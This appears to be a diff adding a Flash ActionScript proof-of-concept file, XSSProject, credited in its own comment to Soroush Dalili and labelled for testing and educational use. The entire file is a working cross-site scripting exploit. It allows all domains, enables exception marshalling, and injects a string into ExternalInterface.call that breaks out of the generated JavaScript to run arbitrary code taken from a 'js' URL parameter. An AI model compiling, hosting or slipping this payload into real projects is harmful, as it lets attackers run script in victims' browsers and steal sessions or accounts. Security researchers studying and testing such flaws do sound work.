@@ -1,0 +1,19 @@
+package
+{
+    import flash.display.Sprite;
+    import flash.external.*;
+    import flash.system.System;
+    public class XSSProject extends Sprite
+    {
+        public function XSSProject()
+        {
+            flash.system.Security.allowDomain("*");
+            ExternalInterface.marshallExceptions = true;
+            try {
+                ExternalInterface.call("0);}catch(e){};"+root.loaderInfo.parameters.js+"///*PoC by Soroush Dalili @IRSDL - only for testing/educational purposes - He accepts no responsibility for any bad/malicious usage*/");
+            } catch(e:Error) {
+                trace(e);
+            }
+        }
+    }
+}
